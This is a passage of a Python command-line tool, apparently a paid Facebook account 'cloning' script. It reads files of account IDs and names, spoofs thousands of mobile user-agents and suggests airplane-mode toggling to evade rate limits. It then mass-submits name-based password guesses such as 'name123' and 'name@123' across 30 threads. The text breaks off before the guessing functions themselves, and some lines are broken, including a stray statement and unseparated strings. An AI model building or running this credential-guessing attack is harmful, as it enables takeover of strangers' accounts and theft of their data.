#SCRIPT FIXED BY 👑 SHAJON 👑
#GITHUB : SHAJON-404
#FACEBOOK : https://facebook.com/mdshahomagdum.shajon/
#YOUTUBE : youtube.com/mrlofi404
#-----------------[ Tutul-King ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
import httpx
pretty.install()
CON=sol()
 #------------------[ Tutul-King ]-------------------#

#------------------[ Tutul-King ]-------------------#

    
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.1; SM-T560NU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A715F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.127 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 281.0.0.16.104 (iPhone15,2; iOS 16_2; it_IT; it-IT; scale=3.00; 1179x2556; 470305378) NW/3"]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B101 Instagram 287.0.0.18.74 (iPhone14,5; iOS 16_1_1; pt_BR; pt; scale=3.00; 1170x2532; 483425622) NW/3"]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B101 Instagram 287.0.0.18.74 (iPhone14,5; iOS 16_1_1; pt_BR; pt; scale=3.00; 1170x2532; 483425622)","Mozilla/5.0 (Linux; Android 10; LYA-L29 Build/HUAWEILYA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]","Mozilla/5.0 (Linux; arm_64; Android 10; Mi 9 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.47 Mobile Safari/537.36 YandexSearch/7.80 YandexSearchBrowser/7.80","Mozilla/5.0 (Linux; Android 9; Redmi 6A Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36 GNews Android/2022127458","Mozilla/5.0 (Linux; Android 9; Mi A1 Build/PKQ1.180917.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; Android 13; SM-N980F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]","Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 GNews Android/2022131834","Mozilla/5.0 (Linux; Android 10; Lenovo TB-X606F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; arm; Android 11; RMX3581) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 YaApp_Android/23.52.1 YaSearchBrowser/23.52.1 BroPP/1.0 SA/3 Mobile Safari/537.36""Mozilla/5.0 (Linux; Android 11; Pixel 5a) AppleWebKit/537.44 (KHTML, like Gecko) Chrome/112.0.5615.101 Mobile Safari/537.43","Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 YaBrowser/23.5.5.333.10 YaApp_iOS/2305.5 YaApp_iOS_Browser/2305.5 Safari/604.1 SA/3","Mozilla/5.0 (Linux; Android 9; SM-J600FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; Android 12; SM-G973F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]","Mozilla/5.0 (Linux; Android 12; SM-A326B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36 GNews Android/2022091362","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Viewer/99.9.7778.79","Mozilla/5.0 (Linux; 13; M2103K19PY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 11; ms-my; RMX3201 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36 HeyTapBrowser/45.9.3.1.1","Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F66 Instagram 287.0.0.18.74 (iPhone11,6; iOS 16_5; it_IT; it; scale=3.00; 1242x2688; 483425622) NW/3","Mozilla/5.0 (Linux; Android 8.1.0; 5059D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2918.62 Safari/537.36","Mozilla/5.0 (Linux; Android 8.0; PRA-TL10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3242 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]","Mozilla/5.0 (Linux; Android 10; CPH2185 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; Android 13; SM-A236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]","Mozilla/5.0 (Linux; Android 11; CPH2239 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36 Vinebre","Mozilla/5.0 (Linux; Android 9; MRD-LX1 Build/HUAWEIMRD-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; Android 11; SM-A505FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.135 Mobile Safari/537.36 OPR/75.2.3978.72468","Mozilla/5.0 (Linux; Android 13; CPH2273 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 GNews Android/2022137898","Mozilla/5.0 (Linux; Android 13; SM-A325F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 GNews Android/2022137898""Mozilla/5.0 (Linux; Android 9; ASUS_X00QDA Build/PPR1.180610.009; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/417.0.0.33.65;]""Mozilla/5.0 (Linux; Android 13; SM-A546B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]"]
def tutulx(fx):
    tutulxz = '2023/2024'  # Default value
    
    if len(fx) == 15:
        if fx[:10] == '1000000000':
            tutulxz = '2009'
        elif fx[:9] == '100000000':
            tutulxz = '2009'
        elif fx[:8] == '10000000':
            tutulxz = '2009'
        elif fx[:7] in ('1000000', '1000001', '1000002', '1000003', '1000004', '1000005'):
            tutulxz = '2009'
        elif fx[:7] in ('1000006', '1000007', '1000008', '1000009'):
            tutulxz = '2010'
        elif fx[:6] == '100001':
            tutulxz = '2010/2011'
        elif fx[:6] in ('100002', '100003'):
            tutulxz = '2011/2012'
        elif fx[:6] == '100004':
            tutulxz = '2012/2013'
        elif fx[:6] in ('100005', '100006'):
            tutulxz = '2013/2014'
        elif fx[:6] in ('100007', '100008'):
            tutulxz = '2014/2015'
        elif fx[:6] == '100009':
            tutulxz = '2015'
        elif fx[:5] == '10001':
            tutulxz = '2015/2016'
        elif fx[:5] == '10002':
            tutulxz = '2016/2017'
        elif fx[:5] == '10003':
            tutulxz = '2018/2019'
        elif fx[:5] == '10004':
            tutulxz = '2019'
        elif fx[:5] == '10005':
            tutulxz = '2020'
        elif fx[:5] in ('10006', '10007', '10008'):
            tutulxz = '2021/2022'
        else:
            tutulxz = '2023'
    elif len(fx) in (9, 10):
        tutulxz = '2008/2009'
    elif len(fx) == 8:
        tutulxz = '2007/2008'
    elif len(fx) == 7:
        tutulxz = '2006/2007'
    
    return tutulxz
 
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
"""
try:
    prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()"""
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; Android 10; SM-A750FN)'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(10):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
for x in range(10):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile/18G82 [FBAN/FBIOS;FBAV/333.0.0.30.109;FBBV/313309308;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/14.7.1;FBSS/3;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/315505842]'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
"""
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('bbnew.txt','r').read().splitlines()
"""
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
 
 

#------------[ Tutul- ]--------------#
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
 
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
#def-approval

#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
os.system('clear')

#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/Tutul.King.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
#os.system("xdg-open https://www.facebook.com/Tutul.King.Ok.Bro")
#-------------------	approvL  ----------#


        
    
#------------------[ LOGO-LAKNAT ]-----------------#
logo =f'''
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[0;91m ████████\033[0;92m ██    ██\033[0;91m ████████\033[0;92m ██    ██\033[0;91m ██ \033[0;92m     ║
║\033[0;91m    ██ \033[0;92m   ██    ██\033[0;91m    ██\033[0;92m    ██    ██\033[0;91m ██  \033[0;92m    ║
║\033[0;91m    ██ \033[0;92m   ██    ██\033[0;91m    ██\033[0;92m    ██    ██\033[0;91m ██  \033[0;92m    ║
║\033[0;91m    ██ \033[0;92m   ██    ██\033[0;91m    ██\033[0;92m    ██    ██\033[0;91m ██   \033[0;92m   ║
║\033[0;91m    ██ \033[0;92m    ██████\033[0;91m     ██\033[0;92m     ██████\033[0;91m  ███████\033[0;92m ║
\x1b[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
\x1b[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m>\x1b[0;41m[ WORKING WIFI+MOBILE DATA ]\x1b[0;92m<\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m \x1b[0;91m\x1b[0;92m║
\x1b[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\x1b[34m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\x1b[33m╠══[Author                   • MR-TUTUL ]     ║
\x1b[31m╠══[Facebook                 • Tutul King ]   ║
\x1b[97m╠══[Github                   • Tutul-King ]   ║
\x1b[34m╠══[Whatsapp                 • 01608843956 ]  ║
\x1b[35m╠══[TOOLS                    • PAID ]         ║
\x1b[33m╠══[VERSION                  • 16.7 ]         ║
\x1b[92m╠══[Key:\x1b[0;41m FIXED BY 👑SHAJON👑 [SHAJON-404]     \x1b[0;92m║
\x1b[34m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝'''
os.system('clear')
print(logo)
uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
os.system("clear")
print(logo)
 
#------------------[ MENU ]----------------#
 #===©===#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)
def menu():
    os.system('clear')
    print(logo)
    print('\x1b[10;97m[\x1b[92;1m+\x1b[10;97m] \x1b[10;92mUSER NAME\x1b[10;91m :\x1b[1;96m ' + uname)
    print("\x1b[10;97m[\x1b[92;1m•\x1b[10;97m] \x1b[0;93mTODAY'S DATE :\x1b[10;92m " + date)
    print('\x1b[10;97m===============================================')
    print('\x1b[10;92m┏━\x1b[1;97m=============================================')
    print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m1\x1b[10;97m]\x1b[10;92m FILE CLONING')
    print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m2\x1b[10;97m] \x1b[10;93mCONTACT WITH ADMIN')
    print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m0\x1b[10;97m] \x1b[10;91mEXIT')
    print('\x1b[10;92m┣━\x1b[1;97m=============================================')
    TUTUL = input('\x1b[10;92m┗━\x1b[10;92m\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;92mCHOOSE \x1b[10;91m•\x1b[10;92m ')
    os.system('clear')
    print(logo)
    if TUTUL in ['111']:
        login()
        dump_massal()
    elif TUTUL in ['1']:
        crack_file()
    elif TUTUL in ['2','02']:
        os.system('xdg-open https://wa.me/+8801972889147')
    elif TUTUL in ['3','03']:
        result()
    elif TUTUL in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print('\x1b[1;97m=============================================')
        animation(' [×] DONE EXIT ')
        exit()
    else:
        print('\033[0;97m=================')
        animation(' [×] SELECT CORRECTLY ')
        back()
#-------------[ CRACK-FROM-FILE ]------------------#
 
def crack_file():
    
    print('\x1b[1;32m[ Put File Example:  /sdcard/File.txt  Etc...]')
    o = input('\x1b[10;97m[\x1b[92;1m+\x1b[10;97m] INPut FILE NAME :\x1b[92;1m  ')
    try:lin = open(o).read().splitlines()
    except:
        print('\033[0;91m==================')
        animation(' \x1b[10;97m[\x1b[10;92m?\x1b[10;97m] \x1b[10;91mFile Not Found')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()
 
#-------------[ PENGATURAN-IDZ ]---------------#
 
def setting():
    print('\x1b[10;91m=============================')
    print('\x1b[10;97m[\x1b[92;1m1\x1b[10;97m] \x1b[0;92mCLONING FOR ONLY OLD IDz')
    print('\x1b[10;97m[\x1b[92;1m2\x1b[10;97m] CLONING FOR ONLY NEW IDz')
    print('\x1b[10;97m[\x1b[92;1m3\x1b[10;97m] \x1b[0;92mCLONING FOR MIX IDz')
    print('\x1b[10;91m=============================')
    
    hu = input('\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;92mCHOOSE \x1b[10;91m•\x1b[10;92m  ')
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    l
    print('\x1b[10;91m==================')
    print('\x1b[10;97m[\x1b[92;1m1\x1b[10;97m] METHOD 1 [\x1b[10;92mCOOKIES SHOW\x1b[10;37m]')
    print('\x1b[10;97m[\x1b[92;1m2\x1b[10;97m] METHOD 2 [\x1b[10;93mNO COOKIES SHOW\x1b[10;37m]')
    print('\x1b[10;91m==================')
    l
    hc = input('\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;92mCHOOSE \x1b[10;91m•\x1b[10;92m')
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['2','02']:
        method.append('free')
    else:
        method.append('mobile')
    passwrd()
    exit() 
 
#-------------------[ BAGIAN-WORDLIST ]------------#
 
def passwrd():
    os.system('clear')
    print(logo)
    print("\x1b[10;92m┏━\x1b[10;97m=============================================")
    print("\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m]\x1b[38;5;208m USER NAME\x1b[10;91m •\x1b[10;96m "+uname)
    print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;92mTOTAL IDz •\x1b[10;97m ',str(len(id)))
    print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;94mYOUR OK IDz SAVED\x1b[10;91m • \x1b[10;93m/sdcard/Tutul•Ok💚.txt')
    print("\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[38;5;208mUSE YOUR \x1b[10;95mAIRPLANE MODE \x1b[10;97m[\x1b[10;92mON\x1b[10;91m/\x1b[10;92mOFF\x1b[10;97m] \x1b[10;92mAFTER\x1b[10;91m•\x1b[10;92m3 MIN")
    print('\x1b[10;92m┗━\x1b[10;97m=============================================')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append(nmf)
                    pwv.append('57273200')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@@@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'111')
                    pwv.append('i love you')
                    pwv.append('password')
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append(nmf)
                    pwv.append('57273200')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@@@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'111')
                    pwv.append('i love you')
                    pwv.append('password')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
